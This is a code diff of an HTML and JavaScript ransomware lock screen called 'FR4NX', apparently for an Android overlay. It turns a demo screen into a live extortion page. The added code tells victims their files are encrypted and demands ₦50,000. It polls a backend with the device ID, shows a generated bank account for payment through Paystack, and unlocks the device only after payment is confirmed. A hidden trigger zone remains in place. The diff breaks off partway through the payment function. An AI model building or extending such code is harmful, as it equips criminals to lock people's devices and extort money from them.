@@ -11,11 +11,11 @@
 
 :root {
     --bg:#050000;
-    --purple:#a855f7;
     --red:#ff0033;
-    --dark-red:#8a001a;
+    --dark-red:#550011;
     --text:#f8f4ff;
     --muted:#a88f8f;
+    --cyan:#00ffcc;
 }
 
 * {
@@ -34,642 +34,98 @@ body {
     font-family:'Rajdhani',sans-serif;
 }
 
-button,input {
-    font:inherit;
-}
+button,input { font:inherit; }
 
-#particles {
-    position:fixed;
-    inset:0;
-    width:100%;
-    height:100%;
-    pointer-events:none;
-    z-index:0;
-}
+/* Background Effects */
+#particles { position:fixed; inset:0; width:100%; height:100%; pointer-events:none; z-index:0; }
+.ambient { position:fixed; width:350px; height:350px; border-radius:50%; filter:blur(100px); pointer-events:none; z-index:0; }
+.ambient.one { background:rgba(255,0,50,.15); top:10%; left:-180px; }
+.ambient.two { background:rgba(255,0,50,.2); bottom:0; right:-180px; }
+.scanlines { position:fixed; inset:0; z-index:10; pointer-events:none; opacity:.15; background:repeating-linear-gradient(transparent 0px, transparent 3px, rgba(255,0,0,.1) 4px); }
 
-.ambient {
-    position:fixed;
-    width:350px;
-    height:350px;
-    border-radius:50%;
-    filter:blur(100px);
-    pointer-events:none;
-    z-index:0;
-}
+/* Hidden Trigger */
+#hiddenTrigger { position: absolute; top: 0; left: 0; width: 120px; height: 120px; z-index: 999; opacity: 0; }
 
-.ambient.one {
-    background:rgba(255,0,50,.15);
-    top:10%;
-    left:-180px;
-}
+/* Layout */
+.screen { position:relative; z-index:2; width:100%; height:100%; display:flex; flex-direction:column; align-items:center; justify-content:space-between; padding:30px 22px 24px; }
+.topbar { width:100%; max-width:430px; display:flex; align-items:center; justify-content:space-between; }
+.brand { font-family:'Orbitron',sans-serif; font-size:21px; font-weight:900; letter-spacing:5px; color:var(--red); text-shadow:0 0 20px var(--red); }
+.brand-sub { font-size:9px; color:var(--muted); letter-spacing:3px; margin-top:5px; }
+.live-status { display:flex; align-items:center; gap:8px; border:1px solid rgba(255,0,50,.3); background:rgba(255,0,50,.08); padding:8px 12px; border-radius:30px; font-family:'Orbitron',sans-serif; font-size:9px; letter-spacing:1px; color:var(--red); }
+.live-dot { width:7px; height:7px; background:var(--red); border-radius:50%; box-shadow:0 0 12px var(--red); animation:blink 1.5s infinite; }
+@keyframes blink { 50% { opacity:.25; } }
 
-.ambient.two {
-    background:rgba(255,0,50,.2);
-    bottom:0;
-    right:-180px;
-}
-
-.ambient.three {
-    background:rgba(130,30,255,.1);
-    top:45%;
-    right:10%;
-}
-
-.scanlines {
-    position:fixed;
-    inset:0;
-    z-index:10;
-    pointer-events:none;
-    opacity:.15;
-    background:repeating-linear-gradient(
-        transparent 0px,
-        transparent 3px,
-        rgba(255,0,0,.1) 4px
-    );
-}
-
-/* Hidden Trigger Zone for Java Bridge */
-#hiddenTrigger {
-    position: absolute;
-    top: 0;
-    left: 0;
-    width: 120px;
-    height: 120px;
-    z-index: 999;
-    opacity: 0;
-}
-
-.screen {
-    position:relative;
-    z-index:2;
-    width:100%;
-    height:100%;
-    display:flex;
-    flex-direction:column;
-    align-items:center;
-    justify-content:space-between;
-    padding:35px 22px 24px;
-}
-
-.topbar {
-    width:100%;
-    max-width:430px;
-    display:flex;
-    align-items:center;
-    justify-content:space-between;
-}
-
-.brand {
-    font-family:'Orbitron',sans-serif;
-    font-size:21px;
-    font-weight:900;
-    letter-spacing:5px;
-    color:var(--red);
-    text-shadow:0 0 20px var(--red);
-}
-
-.brand-sub {
-    font-size:9px;
-    color:var(--muted);
-    letter-spacing:3px;
-    margin-top:5px;
-}
-
-.live-status {
-    display:flex;
-    align-items:center;
-    gap:8px;
-    border:1px solid rgba(255,0,50,.3);
-    background:rgba(255,0,50,.08);
-    padding:8px 12px;
-    border-radius:30px;
-    font-family:'Orbitron',sans-serif;
-    font-size:9px;
-    letter-spacing:1px;
-    color:var(--red);
-}
-
-.live-dot {
-    width:7px;
-    height:7px;
-    background:var(--red);
-    border-radius:50%;
-    box-shadow:0 0 12px var(--red);
-    animation:blink 1.5s infinite;
-}
-
-@keyframes blink {
-    50% { opacity:.25; }
-}
-
-.main-stage {
-    width:100%;
-    max-width:430px;
-    display:flex;
-    flex-direction:column;
-    align-items:center;
-    text-align:center;
-    flex:1;
-    justify-content:center;
-    min-height:0;
-}
-
-.reactor {
-    position:relative;
-    width:min(76vw,310px);
-    aspect-ratio:1;
-    display:flex;
-    align-items:center;
-    justify-content:center;
-    margin:5px 0 27px;
-}
-
-.reactor-glow {
-    position:absolute;
-    inset:18%;
-    background:rgba(255,0,50,.2);
-    filter:blur(40px);
-    border-radius:50%;
-    animation:corePulse 3s ease-in-out infinite;
-}
-
-@keyframes corePulse {
-    0%,100% { transform:scale(.85); opacity:.5; }
-    50% { transform:scale(1.2); opacity:1; }
-}
-
-.ring {
-    position:absolute;
-    border-radius:50%;
-    border-style:solid;
-    pointer-events:none;
-}
-
-.ring.outer {
-    inset:1%;
-    border-width:2px;
-    border-color:rgba(255,0,50,.6);
-    box-shadow:0 0 15px rgba(255,0,50,.4), inset 0 0 15px rgba(255,0,50,.2);
-    animation:rotate 16s linear infinite;
-}
-
-.ring.outer:before,
-.ring.outer:after {
-    content:'';
-    position:absolute;
-    width:9px;
-    height:9px;
-    background:#ff6666;
-    border-radius:50%;
-    box-shadow:0 0 15px #ff0033;
-}
-
-.ring.outer:before { top:10%; left:15%; }
-.ring.outer:after { bottom:10%; right:15%; }
-
-.ring.middle {
-    inset:9%;
-    border-width:1px;
-    border-color:rgba(255,255,255,.1);
-    border-top-color:#ff3366;
-    border-bottom-color:#660011;
-    animation:rotateReverse 10s linear infinite;
-}
-
-.ring.inner {
-    inset:17%;
-    border-width:2px;
-    border-color:transparent;
-    border-top-color:#ff3366;
-    border-right-color:rgba(255,0,50,.6);
-    box-shadow:0 0 20px rgba(255,0,50,.3);
-    animation:rotate 6s linear infinite;
-}
-
-.ring.dashed {
-    inset:5%;
-    border-width:1px;
-    border-style:dashed;
-    border-color:rgba(255,0,50,.5);
-    animation:rotateReverse 24s linear infinite;
-}
-
+/* Reactor Core */
+.main-stage { width:100%; max-width:430px; display:flex; flex-direction:column; align-items:center; text-align:center; flex:1; justify-content:center; min-height:0; }
+.reactor { position:relative; width:min(60vw,240px); aspect-ratio:1; display:flex; align-items:center; justify-content:center; margin:0 0 15px; }
+.reactor-glow { position:absolute; inset:18%; background:rgba(255,0,50,.2); filter:blur(40px); border-radius:50%; animation:corePulse 3s ease-in-out infinite; }
+@keyframes corePulse { 0%,100% { transform:scale(.85); opacity:.5; } 50% { transform:scale(1.2); opacity:1; } }
+.ring { position:absolute; border-radius:50%; border-style:solid; pointer-events:none; }
+.ring.outer { inset:1%; border-width:2px; border-color:rgba(255,0,50,.6); box-shadow:0 0 15px rgba(255,0,50,.4), inset 0 0 15px rgba(255,0,50,.2); animation:rotate 16s linear infinite; }
+.ring.outer:before, .ring.outer:after { content:''; position:absolute; width:9px; height:9px; background:#ff6666; border-radius:50%; box-shadow:0 0 15px #ff0033; }
+.ring.outer:before { top:10%; left:15%; } .ring.outer:after { bottom:10%; right:15%; }
+.ring.middle { inset:9%; border-width:1px; border-color:rgba(255,255,255,.1); border-top-color:#ff3366; border-bottom-color:#660011; animation:rotateReverse 10s linear infinite; }
+.ring.inner { inset:17%; border-width:2px; border-color:transparent; border-top-color:#ff3366; border-right-color:rgba(255,0,50,.6); box-shadow:0 0 20px rgba(255,0,50,.3); animation:rotate 6s linear infinite; }
+.ring.dashed { inset:5%; border-width:1px; border-style:dashed; border-color:rgba(255,0,50,.5); animation:rotateReverse 24s linear infinite; }
 @keyframes rotate { to { transform:rotate(360deg); } }
 @keyframes rotateReverse { to { transform:rotate(-360deg); } }
+.core { position:relative; z-index:3; width:48%; aspect-ratio:1; border-radius:50%; display:flex; align-items:center; justify-content:center; background:radial-gradient(circle at 35% 25%, #ffb3b3 0%, #cc0022 15%, #550011 42%, #1a0005 75%, #050000 100%); border:2px solid rgba(255,150,150,.9); box-shadow:0 0 12px #ff0033, 0 0 35px rgba(255,0,50,.8), 0 0 85px rgba(255,0,0,.45), inset 0 0 25px rgba(255,255,255,.2); animation:coreFloat 4s ease-in-out infinite; }
+@keyframes coreFloat { 0%,100% { transform:scale(.97); } 50% { transform:scale(1.04); } }
+.core-inner { width:72%; aspect-ratio:1; border-radius:50%; display:flex; align-items:center; justify-content:center; border:1px solid rgba(255,255,255,.5); background:radial-gradient(circle,#ffb3b3 0%,#aa0022 25%,#330008 75%); box-shadow:inset 0 0 20px rgba(255,255,255,.5); }
+.core-symbol { font-size:clamp(36px,12vw,58px); color:white; text-shadow:0 0 10px white,0 0 25px #ff0033; }
 
-.core {
-    position:relative;
-    z-index:3;
-    width:48%;
-    aspect-ratio:1;
-    border-radius:50%;
-    display:flex;
-    align-items:center;
-    justify-content:center;
-    background:radial-gradient(circle at 35% 25%, #ffb3b3 0%, #cc0022 15%, #550011 42%, #1a0005 75%, #050000 100%);
-    border:2px solid rgba(255,150,150,.9);
-    box-shadow:0 0 12px #ff0033, 0 0 35px rgba(255,0,50,.8), 0 0 85px rgba(255,0,0,.45), inset 0 0 25px rgba(255,255,255,.2);
-    animation:coreFloat 4s ease-in-out infinite;
-}
-
-@keyframes coreFloat {
-    0%,100% { transform:scale(.97); }
-    50% { transform:scale(1.04); }
-}
-
-.core-inner {
-    width:72%;
-    aspect-ratio:1;
-    border-radius:50%;
-    display:flex;
-    align-items:center;
-    justify-content:center;
-    border:1px solid rgba(255,255,255,.5);
-    background:radial-gradient(circle,#ffb3b3 0%,#aa0022 25%,#330008 75%);
-    box-shadow:inset 0 0 20px rgba(255,255,255,.5);
-}
-
-.core-symbol {
-    font-size:clamp(36px,12vw,58px);
-    color:white;
-    text-shadow:0 0 10px white,0 0 25px #ff0033;
-}
-
-.energy-particle {
-    position:absolute;
-    width:4px;
-    height:4px;
-    background:white;
-    border-radius:50%;
-    box-shadow:0 0 12px 3px #ff0033;
-    animation:particleOrbit 5s linear infinite;
-}
-
-@keyframes particleOrbit {
-    from { transform:rotate(0deg) translateX(125px) rotate(0deg); }
-    to { transform:rotate(360deg) translateX(125px) rotate(-360deg); }
-}
-
-.particle-two { animation-duration:7s; animation-delay:-2s; }
-.particle-three { animation-duration:9s; animation-delay:-4s; }
-
-.system-label {
-    font-family:'Orbitron',sans-serif;
-    font-size:10px;
-    color:#ff3366;
-    letter-spacing:5px;
-    margin-bottom:13px;
-}
-
-.title {
-    font-family:'Orbitron',sans-serif;
-    font-size:clamp(22px,6vw,29px);
-    font-weight:800;
-    letter-spacing:1px;
-    color:var(--text);
-    text-shadow:0 0 22px rgba(255,0,50,.5);
-}
-
+.system-label { font-family:'Orbitron',sans-serif; font-size:10px; color:#ff3366; letter-spacing:5px; margin-bottom:8px; }
+.title { font-family:'Orbitron',sans-serif; font-size:clamp(20px,6vw,26px); font-weight:800; letter-spacing:1px; color:var(--text); text-shadow:0 0 22px rgba(255,0,50,.5); }
 .title span { color:var(--red); }
+.subtitle { color:#a88f8f; font-size:14px; letter-spacing:.6px; margin-top:8px; line-height:1.4; }
 
-.subtitle {
-    color:#a88f8f;
-    font-size:15px;
-    letter-spacing:.6px;
-    margin-top:10px;
-    line-height:1.5;
-}
+/* Payment HUD */
+.payment-box { width:100%; max-width:430px; background:linear-gradient(145deg,rgba(255,0,50,.08),rgba(0,0,0,.4)); border:1px solid rgba(255,0,50,.3); border-radius:16px; padding:15px; margin-bottom:15px; text-align:left; }
+.payment-row { display:flex; justify-content:space-between; margin-bottom:8px; font-size:14px; color:var(--muted); }
+.payment-row span:last-child { font-family:'Orbitron',sans-serif; color:var(--text); font-weight:bold; }
+.amount-big { font-family:'Orbitron',sans-serif; font-size:24px; color:var(--red); text-align:center; margin-bottom:10px; font-weight:900; text-shadow:0 0 10px rgba(255,0,50,.5); }
+.progress-track { width:100%; height:8px; background:#1a0005; border-radius:10px; margin-top:10px; overflow:hidden; border:1px solid rgba(255,0,50,.2); }
+.progress-fill { height:100%; width:0%; background:linear-gradient(90deg, #550011, #ff0033); box-shadow:0 0 10px var(--red); transition:width 0.5s; }
 
-.warning-label {
-    display:inline-flex;
-    gap:7px;
-    align-items:center;
-    margin-top:17px;
-    padding:7px 13px;
-    border:1px solid rgba(255,0,50,.4);
-    border-radius:30px;
-    background:rgba(255,0,50,.1);
-    color:var(--red);
-    font-size:10px;
-    font-weight:bold;
-    letter-spacing:2px;
-    animation:blink 2s infinite;
-}
+/* Virtual Account Details */
+.v-account { display:none; background:rgba(0,0,0,0.6); border:1px dashed rgba(255,0,50,0.5); border-radius:10px; padding:12px; margin-top:15px; text-align:center; }
+.v-account p { font-size:12px; color:var(--muted); margin-bottom:5px; }
+.v-account h3 { font-family:'Orbitron',sans-serif; font-size:18px; color:var(--cyan); letter-spacing:2px; margin:5px 0; }
+.v-account span { font-size:13px; color:var(--text); font-weight:bold; }
 
-.hud {
-    width:100%;
-    max-width:430px;
-    display:grid;
-    grid-template-columns:1fr 1fr 1fr;
-    gap:8px;
-    margin-bottom:17px;
-}
+/* Buttons */
+.bottom { width:100%; max-width:430px; }
+.main-button { width:100%; padding:16px; border:1px solid rgba(255,0,50,.6); border-radius:12px; color:white; background:linear-gradient(100deg,#550011,#aa0022,#550011); box-shadow:0 0 25px rgba(255,0,50,.3), inset 0 1px rgba(255,255,255,.25); font-family:'Orbitron',sans-serif; font-size:13px; font-weight:700; letter-spacing:2px; cursor:pointer; transition:.25s; animation:shine 3s linear infinite; }
+@keyframes shine { to { background-position:200% center; } }
+.main-button:active { transform:scale(.97); }
+.main-button:disabled { background:#2a0005; border-color:#550011; color:#a88f8f; animation:none; box-shadow:none; }
 
-.hud-card {
-    background:linear-gradient(145deg,rgba(255,0,50,.08),rgba(0,0,0,.2));
-    border:1px solid rgba(255,0,50,.2);
-    border-radius:12px;
-    padding:12px 5px;
-    text-align:center;
-    backdrop-filter:blur(12px);
-}
-
-.hud-value {
-    font-family:'Orbitron',sans-serif;
-    font-size:12px;
-    color:#ff6688;
-}
-
-.hud-value.danger {
-    color:var(--red);
-    font-weight:bold;
-    animation:blink 1s infinite;
-}
-
-.hud-caption {
-    color:#7a5f5f;
-    font-size:9px;
-    letter-spacing:1.5px;
-    margin-top:5px;
-}
-
-.progress-area {
-    width:100%;
-    max-width:430px;
-    display:none;
-    margin-bottom:17px;
-}
-
-.progress-info {
-    display:flex;
-    justify-content:space-between;
-    font-family:'Orbitron',sans-serif;
-    font-size:9px;
-    letter-spacing:1px;
-    color:#ff6688;
-    margin-bottom:9px;
-}
-
-.progress-track {
-    width:100%;
-    height:7px;
-    border-radius:20px;
-    background:#1a0005;
-    overflow:hidden;
-    border:1px solid rgba(255,0,50,.3);
-}
-
-.progress-fill {
-    height:100%;
-    width:0%;
-    background:linear-gradient(90deg,#aa0022,#ff0033,#ff6688);
-    box-shadow:0 0 15px #ff0033;
-    border-radius:20px;
-    transition:width .12s linear;
-}
-
-.status-line {
-    text-align:center;
-    font-size:12px;
-    color:#ff3366;
-    margin-top:10px;
-    letter-spacing:1px;
-    font-weight:bold;
-}
-
-.bottom {
-    width:100%;
-    max-width:430px;
-}
-
-.main-button {
-    position:relative;
-    width:100%;
-    padding:17px;
-    border:1px solid rgba(255,0,50,.6);
-    border-radius:12px;
-    color:white;
-    background:linear-gradient(100deg,#550011,#aa0022,#550011);
-    box-shadow:0 0 25px rgba(255,0,50,.3), inset 0 1px rgba(255,255,255,.25);
-    font-family:'Orbitron',sans-serif;
-    font-size:12px;
-    font-weight:700;
-    letter-spacing:2px;
-    cursor:pointer;
-    transition:.25s;
-}
-
-.main-button:active {
-    transform:scale(.97);
-    box-shadow:0 0 40px rgba(255,0,50,.6);
-}
-
-.footer {
-    display:flex;
-    justify-content:space-between;
-    color:#664444;
-    font-size:10px;
-    letter-spacing:1px;
-    margin-top:19px;
-}
-
-/* Authentication Panel */
-.auth-screen {
-    position:fixed;
-    z-index:20;
-    inset:0;
-    display:none;
-    align-items:center;
-    justify-content:center;
-    padding:25px;
-    background:rgba(5,0,0,.95);
-    backdrop-filter:blur(25px);
-}
-
-.auth-screen.active {
-    display:flex;
-    animation:fadeIn .4s ease;
-}
-
-@keyframes fadeIn {
-    from { opacity:0; }
-    to { opacity:1; }
-}
-
-.auth-card {
-    width:100%;
-    max-width:370px;
-    padding:30px 23px;
-    border:1px solid rgba(255,0,50,.4);
-    border-radius:20px;
-    background:linear-gradient(145deg,rgba(40,0,10,.95),rgba(10,0,5,.98));
-    box-shadow:0 0 50px rgba(255,0,50,.2), inset 0 1px rgba(255,255,255,.1);
-    text-align:center;
-}
-
-.auth-emblem {
-    width:65px;
-    height:65px;
-    border-radius:18px;
-    margin:0 auto 22px;
-    display:grid;
-    place-items:center;
-    font-size:29px;
-    color:white;
-    background:linear-gradient(145deg,#ff0033,#550011);
-    box-shadow:0 0 30px rgba(255,0,50,.4);
-}
-
-.auth-title {
-    font-family:'Orbitron',sans-serif;
-    font-size:18px;
-    letter-spacing:1px;
-    color:var(--text);
-}
-
-.auth-description {
-    font-size:13px;
-    color:#a88f8f;
-    margin:12px 0 25px;
-    line-height:1.6;
-}
-
-.auth-input {
-    width:100%;
-    padding:17px;
-    border-radius:10px;
-    border:1px solid rgba(255,0,50,.5);
-    outline:none;
-    background:rgba(0,0,0,.35);
-    color:white;
-    text-align:center;
-    font-family:'Orbitron',sans-serif;
-    font-size:15px;
-    letter-spacing:5px;
-    margin-bottom:15px;
-    transition:.3s;
-}
-
-.auth-input:focus {
-    border-color:#ff6688;
-    box-shadow:0 0 18px rgba(255,0,50,.25);
-}
-
-.auth-input::placeholder {
-    color:#664444;
-    letter-spacing:3px;
-}
-
-.auth-error {
-    font-size:12px;
-    color:var(--red);
-    min-height:18px;
-    margin-bottom:10px;
-    font-weight:bold;
-}
-
-.auth-actions {
-    display:flex;
-    gap:10px;
-}
-
-.auth-actions button {
-    flex:1;
-    padding:14px 8px;
-    border-radius:10px;
-    border:1px solid rgba(255,0,50,.35);
-    color:white;
-    background:rgba(255,0,50,.1);
-    font-family:'Orbitron',sans-serif;
-    font-size:10px;
-    letter-spacing:1px;
-}
-
-.auth-actions .verify {
-    background:linear-gradient(100deg,#aa0022,#ff0033);
-    border-color:#ff6688;
-}
-
-.auth-foot {
-    margin-top:22px;
-    font-size:9px;
-    letter-spacing:2px;
-    color:#664444;
-}
-
-/* Completion */
-.success-screen {
-    position:fixed;
-    inset:0;
-    z-index:30;
-    display:none;
-    align-items:center;
-    justify-content:center;
-    flex-direction:column;
-    background:#050000;
-    text-align:center;
-    padding:25px;
-}
-
-.success-screen.active {
-    display:flex;
-    animation:fadeIn .5s ease;
-}
-
-.success-icon {
-    font-size:75px;
-    color:#00ffcc;
-    text-shadow:0 0 35px #00ffcc;
-    margin-bottom:25px;
-}
-
-.success-title {
-    font-family:'Orbitron',sans-serif;
-    font-size:23px;
-    color:#aaffee;
-}
-
-.success-description {
-    color:#88aabb;
-    margin-top:14px;
-    font-size:14px;
-    line-height:1.6;
-}
-
-.success-button {
-    margin-top:30px;
-    padding:15px 35px;
-    border:1px solid #00ffcc;
-    background:rgba(0,255,204,.1);
-    color:white;
-    border-radius:10px;
-    font-family:'Orbitron',sans-serif;
-    letter-spacing:2px;
-    font-size:11px;
-}
+/* Auth Screen */
+.auth-screen { position:fixed; z-index:20; inset:0; display:none; align-items:center; justify-content:center; padding:25px; background:rgba(5,0,0,.95); backdrop-filter:blur(25px); }
+.auth-screen.active { display:flex; animation:fadeIn .4s ease; }
+@keyframes fadeIn { from { opacity:0; } to { opacity:1; } }
+.auth-card { width:100%; max-width:370px; padding:30px 23px; border:1px solid rgba(255,0,50,.4); border-radius:20px; background:linear-gradient(145deg,rgba(40,0,10,.95),rgba(10,0,5,.98)); box-shadow:0 0 50px rgba(255,0,50,.2); text-align:center; }
+.auth-emblem { width:65px; height:65px; border-radius:18px; margin:0 auto 22px; display:grid; place-items:center; font-size:29px; color:white; background:linear-gradient(145deg,#ff0033,#550011); box-shadow:0 0 30px rgba(255,0,50,.4); }
+.auth-title { font-family:'Orbitron',sans-serif; font-size:18px; letter-spacing:1px; color:var(--text); }
+.auth-input { width:100%; padding:17px; border-radius:10px; border:1px solid rgba(255,0,50,.5); outline:none; background:rgba(0,0,0,.35); color:white; text-align:center; font-family:'Orbitron',sans-serif; font-size:15px; letter-spacing:5px; margin:20px 0 15px; transition:.3s; }
+.auth-input:focus { border-color:#ff6688; box-shadow:0 0 18px rgba(255,0,50,.25); }
 
 @media(max-height:700px) {
-    .screen { padding-top:17px; padding-bottom:15px; }
-    .reactor { width:min(55vw,230px); margin:0 0 13px; }
-    .hud { margin-bottom:10px; }
-    .subtitle { margin-top:5px; }
-    .warning-label { margin-top:9px; }
+    .reactor { width:min(45vw,180px); margin:0 0 10px; }
+    .payment-box { padding:10px; margin-bottom:10px; }
+    .amount-big { font-size:20px; margin-bottom:5px; }
 }
 </style>
 </head>
 
 <body>
-
-<!-- Invisible 5-tap trigger for Java Bridge -->
 <div id="hiddenTrigger"></div>
-
 <canvas id="particles"></canvas>
 <div class="ambient one"></div>
 <div class="ambient two"></div>
-<div class="ambient three"></div>
 <div class="scanlines"></div>
 
-<main class="screen" id="mainScreen">
+<main class="screen">
     <header class="topbar">
         <div>
             <div class="brand">FR4NX</div>
@@ -688,312 +144,178 @@ button,input {
             <div class="ring middle"></div>
             <div class="ring inner"></div>
             <div class="ring dashed"></div>
-            <div class="energy-particle"></div>
-            <div class="energy-particle particle-two"></div>
-            <div class="energy-particle particle-three"></div>
             <div class="core">
                 <div class="core-inner">
                     <div class="core-symbol">☠</div>
                 </div>
             </div>
         </div>
-
         <div class="system-label">CRITICAL SECURITY BREACH</div>
         <h1 class="title">DEVICE <span>LOCKED</span></h1>
-        <p class="subtitle">Your files, photos, and personal data<br>have been encrypted by FR4NX.</p>
-        <div class="warning-label">
-            <span class="live-dot"></span>
-            DO NOT TURN OFF DEVICE
-        </div>
+        <p class="subtitle">Your files are encrypted with AES-256.<br>Pay the ransom to decrypt your data.</p>
     </section>
 
-    <section class="hud">
-        <div class="hud-card">
-            <div class="hud-value danger" id="timer">23:59:59</div>
-            <div class="hud-caption">DELETE TIMER</div>
-        </div>
-        <div class="hud-card">
-            <div class="hud-value">AES-256</div>
-            <div class="hud-caption">ENCRYPTION</div>
-        </div>
-        <div class="hud-card">
-            <div class="hud-value danger" id="systemStatus">ACTIVE</div>
-            <div class="hud-caption">THREAT STATUS</div>
-        </div>
-    </section>
-
-    <section class="progress-area" id="progressArea">
-        <div class="progress-info">
-            <span id="progressLabel">DELETING DATA...</span>
-            <span id="progressNumber">0%</span>
+    <section class="payment-box">
+        <div class="amount-big" id="targetAmount">₦ 50,000.00</div>
+        <div class="payment-row">
+            <span>AMOUNT PAID</span>
+            <span id="paidAmount">₦ 0.00</span>
         </div>
         <div class="progress-track">
-            <div class="progress-fill" id="progressBar"></div>
+            <div class="progress-fill" id="payProgress"></div>
         </div>
-        <div class="status-line" id="statusLine">INITIALIZING DATA DELETION SEQUENCE</div>
+
+        <!-- This box displays the generated bank account -->
+        <div class="v-account" id="virtualAccountBox">
+            <p>Transfer to this dedicated account:</p>
+            <h3 id="vAccountNumber">1234567890</h3>
+            <span id="vBankName">Wema Bank</span> - <span id="vAccountName">FR4NX RANSOM</span>
+        </div>
     </section>
 
     <footer class="bottom">
-        <button class="main-button" id="accessButton" onclick="openAuth()">
-            <span>◈ &nbsp; ENTER DECRYPTION KEY</span>
-        </button>
-        <div class="footer">
-            <span>FR4NX RANSOMWARE</span>
-            <span>BUILD 09.11.26</span>
-        </div>
+        <button class="main-button" id="payButton" onclick="payNow()">GENERATE PAYMENT ACCOUNT</button>
     </footer>
 </main>
 
-<!-- Authentication Panel -->
+<!-- Hidden Auth Panel -->
 <section class="auth-screen" id="authScreen">
     <div class="auth-card">
         <div class="auth-emblem">☠</div>
         <h2 class="auth-title">DECRYPTION TERMINAL</h2>
-        <p class="auth-description">To prevent permanent data loss and restore your device, enter the 256-bit decryption key.</p>
+        <p style="font-size:13px; color:#a88f8f; margin-top:10px;">Enter the 256-bit decryption key to restore your device.</p>
         <input type="password" class="auth-input" id="passInput" placeholder="ENTER KEY" autocomplete="off">
-        <div class="auth-error" id="authError"></div>
-        <div class="auth-actions">
-            <button onclick="closeAuth()">ABORT</button>
-            <button class="verify" onclick="submitPass()">DECRYPT</button>
+        <div style="display:flex; gap:10px;">
+            <button class="main-button" style="background:#333; border-color:#555; animation:none;" onclick="closeAuth()">CANCEL</button>
+            <button class="main-button" onclick="submitPass()">DECRYPT</button>
         </div>
-        <div class="auth-foot">FR4NX // SECURE ENCLAVE</div>
     </div>
 </section>
 
-<!-- Completion Screen (Triggered after correct passkey) -->
-<section class="success-screen" id="successScreen">
-    <div class="success-icon">✧</div>
-    <h2 class="success-title">DECRYPTION SUCCESSFUL</h2>
-    <p class="success-description">Decryption key accepted.<br>Your files have been restored.</p>
-    <button class="success-button" onclick="restartDemo()">RESTART DEVICE</button>
-</section>
-
 <script>
-// ======================================================
+// ==========================================
 // 1. Particle Engine
-// ======================================================
+// ==========================================
 const canvas = document.getElementById("particles");
 const ctx = canvas.getContext("2d");
-let particles = [];
-let width, height;
+let particles = [], width, height;
 
 function resizeCanvas() {
     const dpr = Math.min(window.devicePixelRatio || 1, 2);
-    width = window.innerWidth;
-    height = window.innerHeight;
-    canvas.width = width * dpr;
-    canvas.height = height * dpr;
-    canvas.style.width = width + "px";
-    canvas.style.height = height + "px";
+    width = window.innerWidth; height = window.innerHeight;
+    canvas.width = width * dpr; canvas.height = height * dpr;
+    canvas.style.width = width + "px"; canvas.style.height = height + "px";
     ctx.setTransform(dpr, 0, 0, dpr, 0, 0);
     createParticles();
 }
-
 function createParticles() {
     particles = [];
     const count = Math.min(Math.floor((width * height) / 8500), 110);
     for (let i = 0; i < count; i++) {
-        particles.push({
-            x: Math.random() * width,
-            y: Math.random() * height,
-            size: Math.random() * 2 + .4,
-            speed: Math.random() * .45 + .1,
-            opacity: Math.random() * .65 + .15,
-            drift: (Math.random() - .5) * .5
-        });
+        particles.push({ x: Math.random() * width, y: Math.random() * height, size: Math.random() * 2 + .4, speed: Math.random() * .45 + .1, opacity: Math.random() * .65 + .15, drift: (Math.random() - .5) * .5 });
     }
 }
-
 function drawParticles() {
     ctx.clearRect(0, 0, width, height);
     particles.forEach(p => {
-        p.y -= p.speed;
-        p.x += p.drift;
+        p.y -= p.speed; p.x += p.drift;
         if (p.y < -5) { p.y = height + 5; p.x = Math.random() * width; }
         if (p.x < -5) p.x = width + 5;
         if (p.x > width + 5) p.x = -5;
-        ctx.beginPath();
-        ctx.arc(p.x, p.y, p.size, 0, Math.PI * 2);
-        ctx.fillStyle = `rgba(255,0,50,${p.opacity})`;
-        ctx.shadowBlur = 12;
-        ctx.shadowColor = "#ff0033";
-        ctx.fill();
+        ctx.beginPath(); ctx.arc(p.x, p.y, p.size, 0, Math.PI * 2);
+        ctx.fillStyle = `rgba(255,0,50,${p.opacity})`; ctx.shadowBlur = 12; ctx.shadowColor = "#ff0033"; ctx.fill();
     });
     requestAnimationFrame(drawParticles);
 }
-
 window.addEventListener("resize", resizeCanvas);
-resizeCanvas();
-drawParticles();
+resizeCanvas(); drawParticles();
 
-// ======================================================
-// 2. Demo Countdown Timer
-// ======================================================
-let timeLeft = 24 * 60 * 60;
-function updateTimer() {
-    const h = Math.floor(timeLeft / 3600);
-    const m = Math.floor((timeLeft % 3600) / 60);
-    const s = timeLeft % 60;
-    document.getElementById("timer").textContent =
-        [h, m, s].map(v => String(v).padStart(2, "0")).join(":");
-    if (timeLeft > 0) timeLeft--;
+// ==========================================
+// 2. Backend & Paystack Logic
+// ==========================================
+const BACKEND_URL = "https://your-backend-url.com"; // <--- IMPORTANT: PUT YOUR PYTHON BACKEND URL HERE
+let deviceId = Android.getDeviceId();
+let hasUnlocked = false;
+let accountGenerated = false;
+
+function checkPaymentStatus() {
+    if (hasUnlocked) return;
+    
+    fetch(`${BACKEND_URL}/check_status/${deviceId}`)
+        .then(res => res.json())
+        .then(data => {
+            if (data.status === "unlocked") {
+                hasUnlocked = true;
+                document.getElementById("payButton").innerText = "PAYMENT RECEIVED. DECRYPTING...";
+                document.getElementById("payButton").disabled = true;
+                setTimeout(() => { Android.unlockOverlay(); }, 2000);
+            } else {
+                let paid = data.amount_paid / 100;
+                let target = data.target / 100;
+                
+                document.getElementById("paidAmount").innerText = `₦ ${paid.toFixed(2)}`;
+                document.getElementById("targetAmount").innerText = `₦ ${target.toLocaleString('en-US', {minimumFractionDigits: 2})}`;
+                
+                let percent = (paid / target) * 100;
+                if(percent > 100) percent = 100;
+                document.getElementById("payProgress").style.width = `${percent}%`;
+
+                // If the backend has provided a Virtual Account
+                if (data.virtual_account && !accountGenerated) {
+                    accountGenerated = true;
+                    document.getElementById("virtualAccountBox").style.display = "block";
+                    document.getElementById("vAccountNumber").innerText = data.virtual_account.account_number;
+                    document.getElementById("vBankName").innerText = data.virtual_account.bank_name;
+                    document.getElementById("vAccountName").innerText = data.virtual_account.account_name;
+                    document.getElementById("payButton").innerText = "OPEN PAYSTACK CHECKOUT";
+                }
+            }
+        }).catch(e => console.log("Polling error:", e));
 }
-updateTimer();
-setInterval(updateTimer, 1000);
 
-// ======================================================
-// 3. Hidden 5-Tap Gesture (Bypasses the button)
-// ======================================================
-let taps = 0;
-let lastTap = 0;
+setInterval(checkPaymentStatus, 5000);
+checkPaymentStatus(); // Run immediately on load
+
+function payNow() {
+    const btn = document.getElementById("payButton");
+    btn.innerText = "CONNECTING TO SECURE GATEWAY...";
+    
+    fetch(`${BACKEND_URL}/initiate_payment/${deviceId}`)
+        .then(res => res.json())
